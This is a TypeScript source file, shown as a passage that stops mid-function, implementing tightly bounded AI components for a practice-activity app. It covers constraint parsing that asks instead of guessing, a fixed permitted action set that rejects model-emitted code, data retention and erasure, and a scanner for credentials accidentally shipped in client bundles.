/**
 * #529 SQ-17 — Bounded AI-powered product components with tested fallback.
 *
 * Generates the whole slice together: a finite connected-app domain (short
 * practice activities with time / equipment / noise constraints), natural
 * language compiled into narrow predicates over *known* actions, a
 * deterministic policy that owns the permitted action set, a server-side
 * credential contract with declared network/data purpose, an end-to-end
 * deadline and bounded usage, inspectable and correctable interpretations,
 * minimal retention with erasure, and a deterministic flow that stays useful
 * when the semantic service is unavailable.
 *
 * The model informs a tested action. It cannot widen the action vocabulary,
 * invent an activity, supply a quantity the user never stated, emit executable
 * code or privileged tool calls, or authorize anything by being confident.
 *
 * Paper / synthetic. No network. Consumes #512+#515+#516+#518+#520+#523.
 * NO_528_IMPL cleared by #528. NO_529_IMPL cleared by #529.
 * Does not implement #511 closeout or #573.
 */
import {
  computeQuestionPackContentDigest,
  parseQuestionPack,
  withQuestionPackContentDigest,
  type QuestionPack,
} from "../../contracts/semantic/question-pack.js";
import { parseSemanticQuestionResult, type SemanticQuestionResult } from "../../contracts/semantic/questions.js";
import {
  ACTIVITY_NOISE_LEVELS,
  BOUNDED_AI_COMPONENTS_MODEL_LIMITATIONS,
  BOUNDED_AI_COMPONENTS_RECIPE_POLICY,
  CORRECTION_UI_HOOKS,
  EQUIPMENT_KINDS,
  PERMITTED_COMPONENT_ACTIONS,
  SUPPORTED_COMPONENT_LANGUAGES,
  type ActionRejectionReason,
  type ActivityNoiseLevel,
  type BoundedAiComponentsRecipePolicy,
  type ComponentFailureCode,
  type ComponentMode,
  type ComponentPermission,
  type ConstraintParseOutcome,
  type EquipmentKind,
  type InterpretationSlot,
  type PermittedComponentAction,
} from "../../catalog/workflows/bounded-ai-product-components.js";

export const BOUNDED_AI_COMPONENTS_ISSUE = "#529" as const;
export const BOUNDED_AI_COMPONENTS_EPIC = "#511" as const;
export const BOUNDED_AI_COMPONENTS_PLANNING_ID = "SQ-17" as const;
export const BOUNDED_AI_COMPONENTS_CONSUMES = ["#512", "#515", "#516", "#518", "#520", "#523"] as const;
export const BOUNDED_AI_COMPONENTS_STAMP = "0.221.50" as const;
export const BOUNDED_AI_COMPONENTS_SCHEMA_VERSION = 1 as const;
export const BOUNDED_AI_COMPONENTS_NO_NETWORK = true as const;
export const BOUNDED_AI_COMPONENTS_NO_CHATBOT = true as const;
export const BOUNDED_AI_COMPONENTS_NO_UNCONSTRAINED_TOOLS = true as const;
export const BOUNDED_AI_COMPONENTS_NO_MODEL_EMITTED_CODE = true as const;
export const BOUNDED_AI_COMPONENTS_NO_RUNTIME_GENERATED_UI = true as const;
export const BOUNDED_AI_COMPONENTS_NO_CLIENT_API_KEY = true as const;
export const BOUNDED_AI_COMPONENTS_NO_ON_DEVICE_TYPESAFE_CLAIM = true as const;
export const BOUNDED_AI_COMPONENTS_NO_DISTILLATION = true as const;
export const BOUNDED_AI_COMPONENTS_NO_UNAPPROVED_DATA_TRANSFER = true as const;
export const BOUNDED_AI_COMPONENTS_NO_INVENTED_CONSTRAINTS = true as const;
export const BOUNDED_AI_COMPONENTS_NO_TUCK_RUNTIME_TYPESAFE = true as const;
export const BOUNDED_AI_COMPONENTS_CONFIDENCE_IS_NOT_AUTHORIZATION = true as const;
export const BOUNDED_AI_COMPONENTS_AMBIGUITY_IS_NOT_A_FACT = true as const;
export const BOUNDED_AI_COMPONENTS_OUTAGE_STAYS_USEFUL = true as const;
export const BOUNDED_AI_COMPONENTS_NO_529_IMPL = false as const;
export const BOUNDED_AI_COMPONENTS_NEXT_AFTER_CLOSE = "#511" as const;

export { BOUNDED_AI_COMPONENTS_MODEL_LIMITATIONS, BOUNDED_AI_COMPONENTS_RECIPE_POLICY, PERMITTED_COMPONENT_ACTIONS };
export type {
  ActionRejectionReason,
  ActivityNoiseLevel,
  BoundedAiComponentsRecipePolicy,
  ComponentFailureCode,
  ComponentMode,
  ComponentPermission,
  ConstraintParseOutcome,
  EquipmentKind,
  InterpretationSlot,
  PermittedComponentAction,
};

export class BoundedAiComponentError extends Error {
  readonly code: string;
  constructor(code: string, message: string) {
    super(message);
    this.name = "BoundedAiComponentError";
    this.code = code;
  }
}

// ---------------------------------------------------------------------------
// Finite domain: a connected practice-activity app (paper / synthetic).
// ---------------------------------------------------------------------------

export interface PracticeActivity {
  readonly activityId: string;
  readonly title: string;
  readonly durationMinutes: number;
  readonly requiredEquipment: readonly EquipmentKind[];
  readonly noiseLevel: ActivityNoiseLevel;
  readonly prerequisiteActivityIds: readonly string[];
  readonly requiredPermissions: readonly ComponentPermission[];
}

export interface ActivityCatalog {
  readonly catalogId: string;
  readonly revision: string;
  readonly generatedAtIso: string;
  readonly activities: readonly PracticeActivity[];
}

export interface ComponentContext {
  readonly sessionId: string;
  readonly nowIso: string;
  readonly catalog: ActivityCatalog;
  readonly grantedPermissions: readonly ComponentPermission[];
  readonly completedActivityIds: readonly string[];
}

export type CatalogFreshness = "fresh" | "stale" | "empty";

export function catalogFreshness(catalog: ActivityCatalog, nowIso: string): CatalogFreshness {
  if (catalog.activities.length === 0) return "empty";
  const generated = Date.parse(catalog.generatedAtIso);
  const now = Date.parse(nowIso);
  if (Number.isNaN(generated) || Number.isNaN(now)) {
    throw new BoundedAiComponentError("catalog.invalid_timestamp", "Catalog and clock timestamps must be ISO-8601");
  }
  return now - generated > BOUNDED_AI_COMPONENTS_RECIPE_POLICY.catalogStaleAfterMs ? "stale" : "fresh";
}

// ---------------------------------------------------------------------------
// NL → narrow predicates over known actions. Ambiguity asks; it never invents.
// ---------------------------------------------------------------------------

const EXACT_DURATION = /\b(\d{1,3})\s*(?:-|–|to)?\s*(?:min|mins|minute|minutes)\b/iu;
const HEDGED_DURATION = /\b(?:a few|a couple|a bit|some|several|short|quick|a while|later|maybe|about|around)\b/iu;
const NO_EQUIPMENT = /\b(?:no (?:equipment|gear|kit)|nothing|bodyweight|empty[- ]handed)\b/iu;
const HEDGE_MARKER = /\b(?:maybe|possibly|i think|probably|might|not sure|or so|kind of|sort of)\b/iu;
const EQUIPMENT_PHRASES: readonly { readonly kind: EquipmentKind; readonly pattern: RegExp }[] = [
  { kind: "mat", pattern: /\bmats?\b/iu },
  { kind: "chair", pattern: /\bchairs?\b/iu },
  { kind: "wall", pattern: /\bwalls?\b/iu },
  { kind: "resistance_band", pattern: /\b(?:resistance )?bands?\b/iu },
  { kind: "headphones", pattern: /\b(?:head ?phones|earbuds)\b/iu },
];
/** Gear words the product knows are gear but has no catalog vocabulary for. Asked about, never mapped. */
const OUT_OF_VOCABULARY_EQUIPMENT = /\b(?:kettlebells?|barbells?|dumbbells?|treadmills?|rowers?|pull[- ]?up bars?)\b/iu;
const NOISE_PHRASES: readonly { readonly level: ActivityNoiseLevel; readonly pattern: RegExp }[] = [
  { level: "silent", pattern: /\b(?:silent|no (?:noise|sound)|totally quiet|library)\b/iu },
  { level: "quiet", pattern: /\b(?:quiet|keep it down|low noise|roommate|baby (?:is )?asleep)\b/iu },
  { level: "audible", pattern: /\b(?:noise is fine|loud is fine|can be loud|alone at home)\b/iu },
];

export interface SlotInterpretation {
  readonly slot: InterpretationSlot;
  readonly outcome: ConstraintParseOutcome;
  readonly value: number | readonly EquipmentKind[] | ActivityNoiseLevel | null;
  readonly sourcePhrase: string | null;
  /** Always false: a slot is exact, asked about, or absent. There is no third state. */
  readonly fabricated: false;
  readonly clarifyingQuestion: string | null;
}

export interface InterpretationCorrection {
  readonly slot: InterpretationSlot;
  readonly fromOutcome: ConstraintParseOutcome;
  readonly fromValue: number | readonly EquipmentKind[] | ActivityNoiseLevel | null;
  readonly toValue: number | readonly EquipmentKind[] | ActivityNoiseLevel;
  readonly correctedBy: "user";
  readonly correctedAtIso: string;
}

export interface InterpretationRecord {
  readonly sessionId: string;
  readonly utterance: string;
  readonly language: string;
  readonly slots: readonly SlotInterpretation[];
  readonly corrections: readonly InterpretationCorrection[];
  readonly inspectable: true;
  readonly correctable: true;
  readonly correctionUiHooks: readonly string[];
  readonly packId: string;
  readonly packVersion: string;
  readonly packDigest: string;
}

function slot(
  name: InterpretationSlot,
  outcome: ConstraintParseOutcome,
  value: SlotInterpretation["value"],
  sourcePhrase: string | null,
  clarifyingQuestion: string | null,
): SlotInterpretation {
  return { slot: name, outcome, value, sourcePhrase, fabricated: false, clarifyingQuestion };
}

function interpretDuration(utterance: string): SlotInterpretation {
  const exact = EXACT_DURATION.exec(utterance);
  if (exact) {
    const minutes = Number.parseInt(exact[1]!, 10);
    const hedgedQuantity = HEDGE_MARKER.test(utterance.slice(Math.max(0, exact.index - 24), exact.index));
    if (hedgedQuantity) {
      return slot(
        "maxDurationMinutes",
        "ambiguous_ask",
        null,
        exact[0],
        `You said "${exact[0].trim()}" but hedged it — how many minutes do you actually have?`,
      );
    }
    return slot("maxDurationMinutes", "exact", minutes, exact[0], null);
  }
  const hedged = HEDGED_DURATION.exec(utterance);
  if (hedged) {
    return slot("maxDurationMinutes", "ambiguous_ask", null, hedged[0], `How many minutes do you have? "${hedged[0].trim()}" is not a number I can filter on.`);
  }
  return slot("maxDurationMinutes", "absent", null, null, null);
}

function interpretEquipment(utterance: string): SlotInterpretation {
  const outOfVocabulary = OUT_OF_VOCABULARY_EQUIPMENT.exec(utterance);
  if (outOfVocabulary) {
    return slot(
      "availableEquipment",
      "ambiguous_ask",
      null,
      outOfVocabulary[0],
      `This catalog has no "${outOfVocabulary[0].trim()}" activities. Which of these do you have: ${EQUIPMENT_KINDS.join(", ")}?`,
    );
  }
  const matched = EQUIPMENT_PHRASES.filter((entry) => entry.pattern.test(utterance));
  if (matched.length > 0) {
    const first = matched[0]!.pattern.exec(utterance)!;
    if (HEDGE_MARKER.test(utterance.slice(Math.max(0, first.index - 24), first.index))) {
      return slot("availableEquipment", "ambiguous_ask", null, first[0], `Do you have a ${matched.map((entry) => entry.kind).join(" / ")} right now, or not?`);
    }
    return slot(
      "availableEquipment",
      "exact",
      matched.map((entry) => entry.kind),
      first[0],
      null,
    );
  }
  const none = NO_EQUIPMENT.exec(utterance);
  if (none) return slot("availableEquipment", "exact", ["none"], none[0], null);
  return slot("availableEquipment", "absent", null, null, null);
}

function interpretNoise(utterance: string): SlotInterpretation {
  for (const entry of NOISE_PHRASES) {
    const hit = entry.pattern.exec(utterance);
    if (!hit) continue;
    if (HEDGE_MARKER.test(utterance.slice(Math.max(0, hit.index - 24), hit.index))) {
      return slot("maxNoiseLevel", "ambiguous_ask", null, hit[0], `How quiet does this need to be: ${ACTIVITY_NOISE_LEVELS.join(" / ")}?`);
    }
    return slot("maxNoiseLevel", "exact", entry.level, hit[0], null);
  }
  return slot("maxNoiseLevel", "absent", null, null, null);
}

export function interpretConstraints(input: { readonly sessionId: string; readonly utterance: string; readonly language?: string }): InterpretationRecord {
  const language = input.language ?? "en";
  if (!(SUPPORTED_COMPONENT_LANGUAGES as readonly string[]).includes(language)) {
    throw new BoundedAiComponentError("interpret.unsupported_language", `Language ${language} is not supported; use the structured controls instead.`);
  }
  return {
    sessionId: input.sessionId,
    utterance: input.utterance,
    language,
    slots: [interpretDuration(input.utterance), interpretEquipment(input.utterance), interpretNoise(input.utterance)],
    corrections: [],
    inspectable: true,
    correctable: true,
    correctionUiHooks: [...CORRECTION_UI_HOOKS],
    packId: BOUNDED_AI_COMPONENTS_QUESTION_PACK.id,
    packVersion: BOUNDED_AI_COMPONENTS_QUESTION_PACK.version,
    packDigest: BOUNDED_AI_COMPONENTS_QUESTION_PACK_DIGEST,
  };
}

export function applyInterpretationCorrection(
  record: InterpretationRecord,
  correction: { readonly slot: InterpretationSlot; readonly value: number | readonly EquipmentKind[] | ActivityNoiseLevel; readonly correctedAtIso: string },
): InterpretationRecord {
  const existing = record.slots.find((entry) => entry.slot === correction.slot);
  if (!existing) throw new BoundedAiComponentError("correction.unknown_slot", `Unknown interpretation slot ${correction.slot}`);
  if (correction.slot === "maxDurationMinutes" && typeof correction.value !== "number") {
    throw new BoundedAiComponentError("correction.type_mismatch", "maxDurationMinutes correction must be a number of minutes");
  }
  if (correction.slot === "maxNoiseLevel" && !(ACTIVITY_NOISE_LEVELS as readonly string[]).includes(String(correction.value))) {
    throw new BoundedAiComponentError("correction.unknown_noise_level", `Unknown noise level ${String(correction.value)}`);
  }
  if (correction.slot === "availableEquipment") {
    const values = Array.isArray(correction.value) ? correction.value : null;
    if (!values || values.some((kind) => !(EQUIPMENT_KINDS as readonly string[]).includes(kind))) {
      throw new BoundedAiComponentError("correction.unknown_equipment", "Equipment correction must use the catalog equipment vocabulary");
    }
  }
  return {
    ...record,
    slots: record.slots.map((entry) => (entry.slot === correction.slot ? slot(entry.slot, "exact", correction.value, entry.sourcePhrase, null) : entry)),
    corrections: [
      ...record.corrections,
      {
        slot: correction.slot,
        fromOutcome: existing.outcome,
        fromValue: existing.value,
        toValue: correction.value,
        correctedBy: "user",
        correctedAtIso: correction.correctedAtIso,
      },
    ],
  };
}

export interface NarrowPredicates {
  readonly maxDurationMinutes: number | null;
  readonly availableEquipment: readonly EquipmentKind[] | null;
  readonly maxNoiseLevel: ActivityNoiseLevel | null;
  readonly unresolvedSlots: readonly InterpretationSlot[];
  readonly clarifyingQuestions: readonly string[];
  readonly invented: false;
}

/** Only `exact` slots become predicates. An ambiguous slot becomes a question, never a filter value. */
export function projectPredicates(record: InterpretationRecord): NarrowPredicates {
  const find = (name: InterpretationSlot): SlotInterpretation => record.slots.find((entry) => entry.slot === name)!;
  const duration = find("maxDurationMinutes");
  const equipment = find("availableEquipment");
  const noise = find("maxNoiseLevel");
  return {
    maxDurationMinutes: duration.outcome === "exact" ? (duration.value as number) : null,
    availableEquipment: equipment.outcome === "exact" ? (equipment.value as readonly EquipmentKind[]) : null,
    maxNoiseLevel: noise.outcome === "exact" ? (noise.value as ActivityNoiseLevel) : null,
    unresolvedSlots: record.slots.filter((entry) => entry.outcome === "ambiguous_ask").map((entry) => entry.slot),
    clarifyingQuestions: record.slots.map((entry) => entry.clarifyingQuestion).filter((question): question is string => question !== null),
    invented: false,
  };
}

const NOISE_RANK: Record<ActivityNoiseLevel, number> = { silent: 0, quiet: 1, audible: 2 };

/** Deterministic filter + stable ranking. No model involvement, no randomness. */
export function filterActivities(catalog: ActivityCatalog, predicates: NarrowPredicates, context: ComponentContext): readonly PracticeActivity[] {
  const available = predicates.availableEquipment;
  return catalog.activities
    .filter((activity) => {
      if (predicates.maxDurationMinutes !== null && activity.durationMinutes > predicates.maxDurationMinutes) return false;
      if (predicates.maxNoiseLevel !== null && NOISE_RANK[activity.noiseLevel] > NOISE_RANK[predicates.maxNoiseLevel]) return false;
      if (available !== null) {
        const needed = activity.requiredEquipment.filter((kind) => kind !== "none");
        if (needed.some((kind) => !available.includes(kind))) return false;
      }
      if (activity.requiredPermissions.some((permission) => !context.grantedPermissions.includes(permission))) return false;
      if (activity.prerequisiteActivityIds.some((id) => !context.completedActivityIds.includes(id))) return false;
      return true;
    })
    .slice()
    .sort((a, b) => a.durationMinutes - b.durationMinutes || a.activityId.localeCompare(b.activityId))
    .slice(0, BOUNDED_AI_COMPONENTS_RECIPE_POLICY.maxCandidateActivities);
}

// ---------------------------------------------------------------------------
// Deterministic policy: the permitted action set is the only way to an effect.
// ---------------------------------------------------------------------------

export interface ActionRequest {
  /** Deliberately a bare string: an unrecognized action must be rejectable, not untypeable. */
  readonly action: string;
  readonly activityId?: string;
  readonly durationMinutes?: number;
  /** Model confidence, recorded for the receipt and ignored for authorization. */
  readonly confidence?: number;
  readonly rationale?: string;
  /** Anything the model tried to smuggle in as code or a tool call. */
  readonly emittedCode?: string;
}

export interface ActionAuthorization {
  readonly action: string;
  readonly allowed: boolean;
  readonly reasonCode: ActionRejectionReason | "permitted";
  readonly reason: string;
  readonly modelConfidence: number | null;
  readonly confidenceConsidered: false;
  readonly permittedActions: readonly PermittedComponentAction[];
}

function reject(request: ActionRequest, reasonCode: ActionRejectionReason, reason: string): ActionAuthorization {
  return {
    action: request.action,
    allowed: false,
    reasonCode,
    reason,
    modelConfidence: request.confidence ?? null,
    confidenceConsidered: false,
    permittedActions: [...PERMITTED_COMPONENT_ACTIONS],
  };
}

export function authorizeAction(request: ActionRequest, context: ComponentContext): ActionAuthorization {
  if (!(PERMITTED_COMPONENT_ACTIONS as readonly string[]).includes(request.action)) {
    return reject(request, "unknown_action", `Action "${request.action}" is outside the permitted action set; model confidence does not widen it.`);
  }
  if (request.emittedCode !== undefined) {
    return reject(request, "model_emitted_code", "The semantic result carried executable content; components never execute model-emitted code or tool calls.");
  }
  const freshness = catalogFreshness(context.catalog, context.nowIso);
  if (freshness === "empty") {
    return reject(request, "missing_catalog_data", "The activity catalog is empty; no activity can be suggested or started.");
  }
  const action = request.action as PermittedComponentAction;
  const needsActivity = action === "suggest_activity" || action === "start_activity_timer";
  if (needsActivity) {
    if (freshness === "stale" && action === "start_activity_timer") {
      return reject(request, "stale_catalog", "The activity catalog is stale; timers stay blocked until it refreshes.");
    }
    const activity = context.catalog.activities.find((entry) => entry.activityId === request.activityId);
    if (!activity) {
      return reject(request, "unknown_activity", `Activity "${request.activityId ?? "(none)"}" is not in catalog revision ${context.catalog.revision}.`);
    }
    if (
      request.durationMinutes !== undefined &&
      (request.durationMinutes < BOUNDED_AI_COMPONENTS_RECIPE_POLICY.minActivityDurationMinutes ||
        request.durationMinutes > BOUNDED_AI_COMPONENTS_RECIPE_POLICY.maxActivityDurationMinutes)
    ) {
      return reject(
        request,
        "parameter_out_of_bounds",
        `Requested ${request.durationMinutes} minutes is outside the ${BOUNDED_AI_COMPONENTS_RECIPE_POLICY.minActivityDurationMinutes}–${BOUNDED_AI_COMPONENTS_RECIPE_POLICY.maxActivityDurationMinutes} minute policy bound.`,
      );
    }
    const missingPermission = activity.requiredPermissions.find((permission) => !context.grantedPermissions.includes(permission));
    if (missingPermission) {
      return reject(request, "missing_permission", `Activity ${activity.activityId} requires the ${missingPermission} permission, which is not granted.`);
    }
    const unmet = activity.prerequisiteActivityIds.find((id) => !context.completedActivityIds.includes(id));
    if (unmet) {
      return reject(request, "prerequisite_unmet", `Activity ${activity.activityId} requires ${unmet} first.`);
    }
  }
  return {
    action,
    allowed: true,
    reasonCode: "permitted",
    reason: `Action ${action} is in the permitted set and satisfies the deterministic policy.`,
    modelConfidence: request.confidence ?? null,
    confidenceConsidered: false,
    permittedActions: [...PERMITTED_COMPONENT_ACTIONS],
  };
}

export type ActionEffect =
  | { readonly kind: "activities_filtered"; readonly activityIds: readonly string[] }
  | { readonly kind: "activity_suggested"; readonly activityId: string; readonly durationMinutes: number; readonly durationSource: "catalog" }
  | {
      readonly kind: "timer_started";
      readonly activityId: string;
      readonly durationMinutes: number;
      readonly durationSource: "catalog";
      readonly startedAtIso: string;
    }
  | { readonly kind: "clarification_asked"; readonly slot: InterpretationSlot; readonly question: string }
  | { readonly kind: "offline_plan_shown"; readonly activityIds: readonly string[]; readonly deterministic: true; readonly stale: boolean }
  | {
      readonly kind: "interpretation_corrected";
      readonly slot: InterpretationSlot;
      readonly toValue: number | readonly EquipmentKind[] | ActivityNoiseLevel;
    };

/**
 * Executes a *permitted* action. Effect payloads come from the catalog and the
 * deterministic policy — never from the model's own numbers.
 */
export function executeAction(
  request: ActionRequest,
  context: ComponentContext,
  extras: {
    readonly candidateActivityIds?: readonly string[];
    readonly clarification?: { readonly slot: InterpretationSlot; readonly question: string };
    readonly correction?: { readonly slot: InterpretationSlot; readonly toValue: number | readonly EquipmentKind[] | ActivityNoiseLevel };
    readonly stale?: boolean;
  } = {},
): ActionEffect {
  const authorization = authorizeAction(request, context);
  if (!authorization.allowed) {
    throw new BoundedAiComponentError(`policy.${authorization.reasonCode}`, authorization.reason);
  }
  const action = request.action as PermittedComponentAction;
  switch (action) {
    case "filter_activities":
      return { kind: "activities_filtered", activityIds: extras.candidateActivityIds ?? [] };
    case "suggest_activity": {
      const activity = context.catalog.activities.find((entry) => entry.activityId === request.activityId)!;
      return { kind: "activity_suggested", activityId: activity.activityId, durationMinutes: activity.durationMinutes, durationSource: "catalog" };
    }
    case "start_activity_timer": {
      const activity = context.catalog.activities.find((entry) => entry.activityId === request.activityId)!;
      return {
        kind: "timer_started",
        activityId: activity.activityId,
        durationMinutes: activity.durationMinutes,
        durationSource: "catalog",
        startedAtIso: context.nowIso,
      };
    }
    case "ask_clarifying_question": {
      if (!extras.clarification) throw new BoundedAiComponentError("execute.missing_clarification", "ask_clarifying_question needs a slot and question");
      return { kind: "clarification_asked", slot: extras.clarification.slot, question: extras.clarification.question };
    }
    case "show_offline_plan":
      return { kind: "offline_plan_shown", activityIds: extras.candidateActivityIds ?? [], deterministic: true, stale: extras.stale ?? false };
    case "record_interpretation_correction": {
      if (!extras.correction) throw new BoundedAiComponentError("execute.missing_correction", "record_interpretation_correction needs a correction");
      return { kind: "interpretation_corrected", slot: extras.correction.slot, toValue: extras.correction.toValue };
    }
  }
}

// ---------------------------------------------------------------------------
// Shipped contracts: credentials, purpose, deadline, usage, retention, erasure.
// ---------------------------------------------------------------------------

export interface RetentionContract {
  readonly retainedFields: readonly string[];
  readonly retentionDays: number;
  readonly erasureSupported: true;
  readonly erasureCascade: readonly string[];
}

export interface UsageRecord {
  readonly inferenceCalls: number;
  readonly maxInferenceCallsPerRequest: number;
  readonly maxDailyInferenceCalls: number;
  readonly endToEndDeadlineMs: number;
  readonly elapsedMs: number;
  readonly withinDeadline: boolean;
  /** Provider cost is unknown at build time; unknown is never reported as zero. */
  readonly costKnown: false;
}

export interface ClientBundleContract {
  readonly credentialLocation: "server_side_only";
  readonly clientSecrets: readonly string[];
  readonly declaredNetworkPurpose: string;
  readonly declaredDataPurpose: string;
  readonly endToEndDeadlineMs: number;
  readonly maxInferenceCallsPerRequest: number;
  readonly maxDailyInferenceCalls: number;
  readonly correctionUiHooks: readonly string[];
  readonly retention: RetentionContract;
  readonly offlineFlowAvailable: true;
  readonly onDeviceModel: false;
  readonly distilledLocalModel: false;
  readonly modelLimitations: readonly string[];
}

export function retentionContract(): RetentionContract {
  return {
    retainedFields: ["sessionId", "interpretationSlots", "selectedActivityId", "correctionLog"],
    retentionDays: BOUNDED_AI_COMPONENTS_RECIPE_POLICY.retentionDays,
    erasureSupported: true,
    erasureCascade: ["session.interpretation", "session.correctionLog", "session.inferenceReceipt"],
  };
}

export function describeClientBundle(): ClientBundleContract {
  return {
    credentialLocation: "server_side_only",
    clientSecrets: [],
    declaredNetworkPurpose: BOUNDED_AI_COMPONENTS_RECIPE_POLICY.declaredNetworkPurpose,
    declaredDataPurpose: BOUNDED_AI_COMPONENTS_RECIPE_POLICY.declaredDataPurpose,
    endToEndDeadlineMs: BOUNDED_AI_COMPONENTS_RECIPE_POLICY.endToEndDeadlineMs,
    maxInferenceCallsPerRequest: BOUNDED_AI_COMPONENTS_RECIPE_POLICY.maxInferenceCallsPerRequest,
    maxDailyInferenceCalls: BOUNDED_AI_COMPONENTS_RECIPE_POLICY.maxDailyInferenceCalls,
    correctionUiHooks: [...CORRECTION_UI_HOOKS],
    retention: retentionContract(),
    offlineFlowAvailable: true,
    onDeviceModel: false,
    distilledLocalModel: false,
    modelLimitations: [...BOUNDED_AI_COMPONENTS_MODEL_LIMITATIONS],
  };
}

export interface ClientArtifact {
  readonly path: string;
  readonly source: string;
}

export interface SecretFinding {
  readonly path: string;
  readonly match: string;
  readonly reason: string;
}

const CLIENT_SECRET_PATTERNS: readonly RegExp[] = [
  /\b(?:sk|pk)-(?:live|test)-[A-Za-z0-9]{8,}/gu,
  /\b[A-Z0-9_]*(?:API_KEY|SECRET|ACCESS_TOKEN|PRIVATE_KEY)\b\s*[:=]\s*["'][^"']{8,}["']/gu,
  /\bBearer\s+[A-Za-z0-9._-]{16,}/gu,
];

/** Shipped-client guard: any credential material in a client artifact is a finding, not a warning. */
export function scanClientArtifactsForSecrets(artifacts: readonly ClientArtifact[]): readonly SecretFinding[] {
  const findings: SecretFinding[] = [];
  for (const artifact of artifacts) {
    for (const pattern of CLIENT_SECRET_PATTERNS) {
      for (const match of artifact.source.matchAll(new RegExp(pattern.source, pattern.flags))) {
        findings.push({ path: artifact.path, match: match[0], reason: "Credential material must live server-side only." });
      }
    }
  }
  return findings;
}

export interface SessionRecord {
  readonly sessionId: string;
  readonly kind: string;
}

export interface ErasureResult {
  readonly sessionId: string;
  readonly erased: number;
  readonly remaining: number;
  readonly cascade: readonly string[];
}

export function eraseComponentSession(
  store: readonly SessionRecord[],
  sessionId: string,
): { readonly store: readonly SessionRecord[]; readonly result: ErasureResult } {
  const remaining = store.filter((record) => record.sessionId !== sessionId);
  return {
    store: remaining,
    result: {
      sessionId,
      erased: store.length - remaining.length,
      remaining: remaining.filter((record) => record.sessionId === sessionId).length,
      cascade: retentionContract().erasureCascade,
    },
  };
}

// ---------------------------------------------------------------------------
// AC5 — no runtime TypeSafe call into TUCK or an existing offline business.
// ---------------------------------------------------------------------------

export interface OfflineBusinessRegistration {
  readonly businessId: string;
  readonly offline: boolean;
  readonly runtimeTypeSafeCall: boolean;
  /** An explicit, recorded scope decision. `null` means nobody decided — which blocks. */
  readonly scopeDecisionId: string | null;
}

export interface OfflineBusinessGuardResult {
  readonly allowed: boolean;
  readonly blocked: readonly string[];
  readonly reason: string;
  readonly inventedScopeDecision: false;
}

export function assertNoRuntimeTypeSafeInOfflineBusiness(registrations: readonly OfflineBusinessRegistration[]): OfflineBusinessGuardResult {
  const blocked = registrations
    .filter((entry) => entry.offline && entry.runtimeTypeSafeCall && (entry.scopeDecisionId === null || entry.scopeDecisionId.trim() === ""))
    .map((entry) => entry.businessId);
  return {
    allowed: blocked.length === 0,
    blocked,
    reason:
      blocked.length === 0
        ? "No offline business carries a runtime TypeSafe call; TUCK's accepted offline contract is untouched."
        : `Runtime TypeSafe call added to offline business ${blocked.join(", ")} without an explicit scope decision.`,
    inventedScopeDecision: false,
  };
}

// ---------------------------------------------------------------------------
// Versioned question pack + policy, stamped with the product build.
// ---------------------------------------------------------------------------

export const BOUNDED_AI_COMPONENTS_QUESTION_PACK: QuestionPack = withQuestionPackContentDigest(
  parseQuestionPack({
    schemaVersion: 1,
    id: "pack.bounded-ai-product-components",
    version: BOUNDED_AI_COMPONENTS_STAMP,
    title: "Bounded practice-activity selection",
    instructions:
      "Choose one activity from the candidates the product already filtered, and say whether the user stated an exact duration. Do not propose activities, actions, or constraints that are not listed.",
    questions: [
      {
        id: "q.select-candidate-activity",
        kind: "choice",
        instruction: "Which listed candidate activity best fits the session's stated constraints?",
        statePaths: ["session.predicates", "session.candidateActivityIds"],
        vocabulary: {
          kind: "choice",
          options: [
            { id: "candidate.first", label: "First listed candidate" },
            { id: "candidate.second", label: "Second listed candidate" },
            { id: "candidate.third", label: "Third listed candidate" },
            { id: "candidate.none", label: "None of the listed candidates fit" },
          ],
        },
      },
      {
        id: "q.duration-stated-exactly",
        kind: "noul",
        instruction: "Judge whether the user stated an exact number of minutes.",
        statePaths: ["session.utterance"],
        vocabulary: { kind: "noul", proposition: "The user stated an exact number of minutes available." },
      },
    ],
    projections: [
      { id: "proj.session-constraints", statePaths: ["session.utterance", "session.predicates"], required: true },
      { id: "proj.session-candidates", statePaths: ["session.candidateActivityIds"], required: true },
    ],
  }),
);

export const BOUNDED_AI_COMPONENTS_QUESTION_PACK_DIGEST: string = computeQuestionPackContentDigest(BOUNDED_AI_COMPONENTS_QUESTION_PACK);

export interface VersionedComponentPolicy {
  readonly buildVersion: string;
  readonly packId: string;
  readonly packVersion: string;
  readonly packDigest: string;
  readonly policy: BoundedAiComponentsRecipePolicy;
  readonly modelLimitations: readonly string[];
}

export function versionedComponentPolicy(): VersionedComponentPolicy {
  return {
    buildVersion: BOUNDED_AI_COMPONENTS_STAMP,
    packId: BOUNDED_AI_COMPONENTS_QUESTION_PACK.id,
    packVersion: BOUNDED_AI_COMPONENTS_QUESTION_PACK.version,
    packDigest: BOUNDED_AI_COMPONENTS_QUESTION_PACK_DIGEST,
    policy: BOUNDED_AI_COMPONENTS_RECIPE_POLICY,
    modelLimitations: [...BOUNDED_AI_COMPONENTS_MODEL_LIMITATIONS],
  };
}

// ---------------------------------------------------------------------------
// The generated component: one bounded request, with a tested fallback.
// ---------------------------------------------------------------------------

/**
 * What the server-side semantic call returned for this request. The component
 * treats every field as advisory input to the deterministic policy.
 */
export interface SemanticServiceState {
  readonly available: boolean;
  readonly latencyMs?: number;
  readonly cancelled?: boolean;
  readonly partial?: boolean;
  /** Raw provider result; parsed through the SQ-01 contract before use. */
  readonly result?: unknown;
  /** The activity id the model wants, if any — checked against the candidate set. */
  readonly proposedActivityId?: string;
  /** Whatever action the model asked for, including ones that do not exist. */
  readonly proposedAction?: ActionRequest;
}

export interface ComponentFailure {
  readonly code: ComponentFailureCode;
  readonly detail: string;
  readonly fabricatedFacts: false;
}

export interface BoundedComponentRun {
  readonly sessionId: string;
  readonly mode: ComponentMode;
  readonly interpretation: InterpretationRecord | null;
  readonly predicates: NarrowPredicates | null;
  readonly candidateActivityIds: readonly string[];
  readonly authorizations: readonly ActionAuthorization[];
  readonly executedActions: readonly PermittedComponentAction[];
  readonly effects: readonly ActionEffect[];
  readonly clarifyingQuestions: readonly string[];
  readonly failure: ComponentFailure | null;
  /** True when the user still gets a real, deterministic thing to do. */
  readonly usable: boolean;
  readonly usage: UsageRecord;
  readonly clientBundle: ClientBundleContract;
  readonly policy: VersionedComponentPolicy;
  readonly networkCallsFromClient: 0;
}

export interface BoundedComponentInput {
  readonly context: ComponentContext;
  readonly utterance: string;
  readonly language?: string;
  readonly service: SemanticServiceState;
}

function usage(inferenceCalls: number, elapsedMs: number): UsageRecord {
  const policy = BOUNDED_AI_COMPONENTS_RECIPE_POLICY;
  return {
    inferenceCalls,
    maxInferenceCallsPerRequest: policy.maxInferenceCallsPerRequest,
